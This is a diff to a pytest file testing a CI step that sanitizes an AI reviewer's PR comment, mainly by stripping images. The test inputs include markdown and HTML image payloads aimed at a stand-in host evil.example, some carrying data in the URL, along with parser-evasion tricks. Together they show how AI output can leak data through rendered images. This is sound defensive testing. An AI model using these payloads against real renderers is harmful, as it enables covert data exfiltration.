@@ -63,12 +63,23 @@ def _fake_gh(tmp_path: Path, changed_files: str = "") -> Path:
 CHANGED
               exit 0
             fi
+            if [ "$1" = "pr" ] && [ "$2" = "view" ]; then
+              [ -f "{tmp_path.as_posix()}/gh-view-fail" ] && {{ echo "HTTP 502" >&2; exit 1; }}
+              [ -f "{tmp_path.as_posix()}/gh-view.txt" ] && cat "{tmp_path.as_posix()}/gh-view.txt"
+              exit 0
+            fi
             exit 0
             """
         ),
         encoding="utf-8",
     )
     (bindir / "gh").chmod(0o755)
+    # 有些 step 會呼叫 python3；Windows 的 Git Bash 不一定找得到，指向跑測試的這個直譯器
+    (bindir / "python3").write_text(
+        f'#!/usr/bin/env bash\nexec "{_msys(Path(sys.executable))}" "$@"\n',
+        encoding="utf-8", newline="\n",
+    )
+    (bindir / "python3").chmod(0o755)
     return bindir
 
 
@@ -388,6 +399,22 @@ def _posted_comment(tmp_path: Path, body: str) -> str:
     return (tmp_path / "comment.md").read_text(encoding="utf-8")
 
 
+import re as _re
+
+_UNESCAPED_IMG = _re.compile(r"(?<!\\)!\[")
+_HTML_IMG = _re.compile(r"<(img|image|source|video|picture|audio|svg)\b", _re.I)
+
+
+def _assert_no_image(out: str):
+    """沒有任何東西能被 GitHub 渲染成圖片：沒有未跳脫的 `![`、沒有圖片類 HTML 標籤。"""
+    assert not _UNESCAPED_IMG.search(out), out
+    assert not _HTML_IMG.search(out), out
+
+
+def _same(body: str, out: str):
+    assert out in (body, body + "\n"), f"程式碼必須一字不改:\n{body!r}\n→\n{out!r}"
+
+
 def test_remote_images_are_neutralized(tmp_path):
     body = (
         "看這張 ![x](https://evil.example/?d=AAAA) 圖\n"
@@ -399,8 +426,7 @@ def test_remote_images_are_neutralized(tmp_path):
     )
     out = _posted_comment(tmp_path, body)
     assert out.count(IMG_PLACEHOLDER) >= 5, out
-    assert "![" not in out.replace("!\\[", "")
-    assert "<img" not in out.lower() and "<source" not in out.lower()
+    _assert_no_image(out)
     for bad in ("](https://evil.example/?d=AAAA)", 'src="https://evil.example/x"'):
         assert bad not in out, out
     assert "[link](https://example.com)" in out, "一般連結不會被自動抓取，必須保留"
@@ -408,14 +434,142 @@ def test_remote_images_are_neutralized(tmp_path):
 
 def test_clean_comment_unchanged(tmp_path):
     body = "## 這個 PR 做了什麼\n改了 `a < b` 的判斷，見 [文件](https://example.com/doc)。\n\n- 項目一\n"
+    _same(body, _posted_comment(tmp_path, body))
+
+
+# --- 程式碼不能被改（fix round 2）
+
+RUST_FENCE = "```rust\nlet v = vec![1, 2];\nlet f = vec![x][0];\n```\n"
+JSX_FENCE = '```tsx\nconst A = () => <img src={logo} alt="x" />;\n```\n'
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        RUST_FENCE,
+        "~~~\nlet v = vec![1, 2];\n~~~\n",
+        "````md\n```\nvec![x][0]\n```\n````\n",          # 外層較長的 fence 包住內層
+        "用 `vec![1, 2]` 與 `vec![x][0]` 即可\n",
+        "用 ``vec![x][0]`` 也行\n",
+        JSX_FENCE,
+        "JSX 寫成 `<img src={logo} alt=\"x\" />`\n",
+        "前文\n\n" + RUST_FENCE + "\n後文 [link](https://example.com)\n",
+    ],
+)
+def test_code_is_left_byte_for_byte(tmp_path, body):
+    _same(body, _posted_comment(tmp_path, body))
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "let v = vec![1, 2];\n",
+        "let f = vec![x][0];\n",
+        "![x](https://evil.example/?d=A)\n",
+        "![a][r]\n\n[r]: https://evil.example/r\n",
+        "![r]\n\n[r]: https://evil.example/r\n",
+        "![a][]\n\n[a]: https://evil.example/r\n",
+        '<IMG\nsrc="https://evil.example/x">\n',
+        "<image src=https://evil.example/i>\n",
+        "<video poster=https://evil.example/p></video>\n",
+        "<img/src=https://evil.example/x>\n",
+        "!![x](y)(https://evil.example/recombine)\n",                 # 換掉後不能拼出新圖片
+        "<im<img x>g src=https://evil.example/r>\n",
+    ],
+)
+def test_images_outside_code_never_survive(tmp_path, body):
     out = _posted_comment(tmp_path, body)
-    assert out == body + "\n" or out == body, repr(out)
+    _assert_no_image(out)
+
+
+@pytest.mark.parametrize(
+    "body, why",
+    [
+        ("```\n![x](https://evil.example/a)\n", "沒關的 fence：一律當成非程式碼，剝掉"),
+        ("````\n![x](https://evil.example/a)\n```\n", "關閉 fence 比開頭短 → 沒關"),
+        ("`foo ![x](https://evil.example/a)\n", "沒關的行內反引號 → 不是程式碼"),
+        ("`foo\n![x](https://evil.example/a) `\n", "行內程式碼不跨行"),
+        ("    ![x](https://evil.example/a)\n", "4 格縮排不當程式碼"),
+        ("<!--\n```\n-->\n![x](https://evil.example/a)\n```\n", "HTML 註解裡的 fence 不算"),
+        ("  ```\nfoo\n```\n![x](https://evil.example/a)\n```\n", "縮排 fence 讓狀態不確定 → 全部不當程式碼"),
+        ("- item\n\n  ```\nx\n  ```\nfoo\n  ```\n  ![x](https://evil.example/a)\n  ```\n", "清單內 fence"),
+        ("> ```\n![x](https://evil.example/a)\n> ```\n", "blockquote 內 fence"),
+        ("<div>\n`<img src=https://evil.example/a>`\n</div>\n", "HTML block 裡反引號不是程式碼"),
+        ("<pre>\n\n`<img src=https://evil.example/a>`\n</pre>\n", "HTML block type 1 跨空行"),
+        ('[a](x "`") ![b](https://evil.example/a) ("`")\n', "連結 title 裡的反引號"),
+        ('<a title="`">![b](https://evil.example/a)<a title="`">\n', "HTML 屬性裡的反引號"),
+        ('<a title="\n`"> ![b](https://evil.example/a) `\n', "跨行 HTML 屬性"),
+        ("| `a | ![x](https://evil.example/a) | b` |\n|---|---|---|\n", "表格的 | 會切開行內程式碼"),
+        ("\\``x` ![x](https://evil.example/a)`\n", "跳脫的反引號"),
+        ("```x`y\n![x](https://evil.example/a)\n```\n", "info string 含反引號的不是 fence"),
+        ("`a\nb` ![x](https://evil.example/a) `c`\n", "跨行配對會讓單行判斷錯開"),
+        ("`a|b` ![x](https://evil.example/a) `c|d`\n", "不是表格時 | 在 code 裡"),
+        ("$a`$ ![x](https://evil.example/a) $`b$\n", "數學 $ 可能先吃掉反引號"),
+        ("| `a | ![x](https://evil.example/a) | b` |\r\n|---|---|---|\r\n", "CRLF 的表格"),
+        ("<details>\n```\n-->\n![x](https://evil.example/a)\n```\n", "HTML block 裡的 fence"),
+    ],
+)
+def test_stripper_cannot_be_tricked_into_treating_images_as_code(tmp_path, body, why):
+    out = _posted_comment(tmp_path, body)
+    assert "evil.example" not in out or not _UNESCAPED_IMG.search(out), why
+    _assert_no_image(out)
+
+
+def test_oversized_output_fails_closed(tmp_path):
+    (tmp_path / "review-output.md").write_text("a" * 300_000 + "\nNEEDS_WORK: no\n", encoding="utf-8")
+    res = _run(_step_script(VERDICT_STEP), tmp_path, _fake_gh(tmp_path), {})
+    assert res.returncode != 0
+    calls = _calls(tmp_path)
+    assert "--body-file comment.md" not in calls, "超過上限不能貼模型的文字"
+    assert "pr edit 1 --add-label needs-work" in calls
+    assert "pr comment 1 --body-file review-failed.md" in calls
+    assert FAILED_MARKER in (tmp_path / "review-failed.md").read_text(encoding="utf-8")
+    assert not (tmp_path / "comment.md").exists() and not (tmp_path / "review-output.md").exists()
+
+
+def test_neutralizer_crash_fails_closed(tmp_path):
+    """python 那段出錯（這裡用一個會讓它崩潰的 python3 替身）時不能貼出模型文字。"""
+    bindir = _fake_gh(tmp_path)
+    (bindir / "python3").write_text("#!/usr/bin/env bash\nexit 1\n", encoding="utf-8", newline="\n")
+    (tmp_path / "review-output.md").write_text("ok\nNEEDS_WORK: no\n", encoding="utf-8")
+    res = _run(_step_script(VERDICT_STEP), tmp_path, bindir, {})
+    assert res.returncode != 0
+    calls = _calls(tmp_path)
+    assert "--body-file comment.md" not in calls
+    assert "pr edit 1 --add-label needs-work" in calls
+
+
+def _neutralizer_module() -> dict:
+    """把 step 裡 heredoc 的 python 原文抽出來，當成模組載入（不執行 main）。"""
+    script = _step_script(VERDICT_STEP)
+    m = _re.search(r"<<'PY'\n(.*?)\nPY\n", script, _re.S)
+    assert m, "找不到 python heredoc"
+    ns: dict = {"__name__": "neutralize_under_test"}
+    exec(compile(m.group(1), "neutralize", "exec"), ns)
+    return ns
+
+
+def test_neutralizer_is_linear_on_pathological_input():
+    import time
+
+    ns = _neutralizer_module()
+    evil = "![" * 50_000 + "<img " * 50_000 + "`" * 3 + "[" * 20_000 + "(" * 20_000
+    t = time.perf_counter()
+    out = ns["neutralize"](evil)
+    assert time.perf_counter() - t < 2.0
+    _assert_no_image(out)
+    many = "`a` ![x](y) `` b `` <img z> " * 5_000
+    t = time.perf_counter()
+    out = ns["neutralize"](many)
+    assert time.perf_counter() - t < 2.0
+    _assert_no_image(out)
 
 
 # ------------------------------------------------------- Claude 失敗時 fail closed
 
 FAILCLOSED_STEP = "Claude 步驟失敗時 fail closed"
 GATE_STEP = "閘門判定"
+FAILED_MARKER = "<!-- gs-auto-fix:ai-review-incomplete -->"
 
 
 def test_failclosed_labels_comments_and_removes_output(tmp_path):
@@ -426,9 +580,42 @@ def test_failclosed_labels_comments_and_removes_output(tmp_path):
     calls = _calls(tmp_path)
     assert "pr edit 1 --add-label needs-work" in calls
     assert "pr comment 1 --body-file review-failed.md" in calls
-    assert "不是對程式碼的判定" in (tmp_path / "review-failed.md").read_text(encoding="utf-8")
+    body = (tmp_path / "review-failed.md").read_text(encoding="utf-8")
+    assert "不是對程式碼的判定" in body and FAILED_MARKER in body
     assert not (tmp_path / "review-output.md").exists()
     assert not (tmp_path / "comment.md").exists()
+
+
+def test_failclosed_does_not_repeat_comment(tmp_path):
+    (tmp_path / "gh-view.txt").write_text(f"舊的\n{FAILED_MARKER}\nAI review 沒有完成\n", encoding="utf-8")
+    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
+    assert res.returncode == 0, res.stderr
+    calls = _calls(tmp_path)
+    assert "pr edit 1 --add-label needs-work" in calls, "label 一定要加"
+    assert "pr comment" not in calls, "已經有同樣的留言就不要再貼"
+
+
+def test_failclosed_label_added_even_if_comment_query_fails(tmp_path):
+    (tmp_path / "gh-view-fail").write_text("", encoding="utf-8")
+    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
+    calls = _calls(tmp_path)
+    assert calls.index("pr edit 1 --add-label needs-work") < calls.index("pr view"), "先加 label"
+    assert "pr comment 1 --body-file review-failed.md" in calls, "查不到既有留言時寧可重貼"
+    assert res.returncode == 0, res.stderr
+
+
+def test_leak_check_pattern_only_wording_is_precautionary(tmp_path):
+    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"
+    _leak_check(tmp_path, f"文件範例 {jwt}\nNEEDS_WORK: no\n", {})
+    body = (tmp_path / "leak-blocked.md").read_text(encoding="utf-8")
+    assert "範例" in body or "測試" in body
+    assert "輪換" not in body, "只是樣式命中時不要叫管理者輪換 token"
+
+
+def test_leak_check_literal_value_wording_says_rotate(tmp_path):
+    _leak_check(tmp_path, f"值 {FAKE_SECRET}\nNEEDS_WORK: no\n", {"LEAK_CLAUDE_TOKEN": FAKE_SECRET})
+    body = (tmp_path / "leak-blocked.md").read_text(encoding="utf-8")
+    assert "輪換" in body
 
 
 def test_failclosed_runs_only_when_claude_step_failed():
